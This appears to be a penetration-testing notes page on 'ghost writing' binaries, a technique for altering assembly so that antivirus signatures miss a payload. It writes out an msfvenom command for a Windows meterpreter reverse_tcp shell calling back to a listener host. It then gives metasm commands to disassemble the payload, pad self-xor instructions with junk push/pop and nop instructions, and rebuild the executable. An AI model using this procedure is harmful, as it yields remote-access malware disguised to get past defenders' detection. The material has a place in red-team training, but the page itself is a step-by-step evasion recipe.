# Ghost Writing Binaries

* Changing of the Assembly source code, to alter the well known signature used by anti-virus engines.
* Overview

```
Create a .exe
Convert it to .asm 
Edit the .asm file
Convert back to .exe 
```

* Most of the time you dont want to alter the functionality of the binary.
* Some additional (outside of Ghostwriting) things that can help with evading signatures are:

```
Removing the Help menu of a tool
Removing instances of the tool name in the source code
```

### Ghost Writing How To

* Generate a `msfvenom` payload for example

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.12 LPORT=4444 -f raw -o payload.raw --platform windows -a x86
```

* Now that you have a raw payload, convert it to ASCII `asm source`
* The Metasm script is a great option to accomplish this&#x20;
* [https://github.com/jjyg/metasm](https://github.com/jjyg/metasm)

```
ruby /opt/metasm/samples/disassemble.rb payload.raw > payload.asm
```

* Now open the file in `gedit`

### Obfuscation of ASM File

* At the very top of the file add:

```
.section '.text' rwx
.entrypoint
```

* Now start by finding any instance of `xor` where a register is `xor` (ed) against itself.
* When something is `xor` against it self, it will clear the register to a value of 0
* For example look for something like this

```
xor eax, eax
```

* Because the normal code execution will clear out any value in `eax` we can add additional instructions before the `xor`
* Thus we can add this in before the `xor` statement&#x20;

```
push eax
pop eax
xor eax, eax
```

* Also feel free to add in other additional irrelevant instructions before an `xor` occurs.  Remember only where an operand is `xor` with itself.
* Also can add `nop` instructions into the program at the correct places.
* Testing is your best friend here

### Convert Back&#x20;

* Once you are done altering the `asm` it is time to convert it back to an `exe`&#x20;

```
ruby /opt/metasm/samples/peencode.rb payload.asm -o payload.exe
```
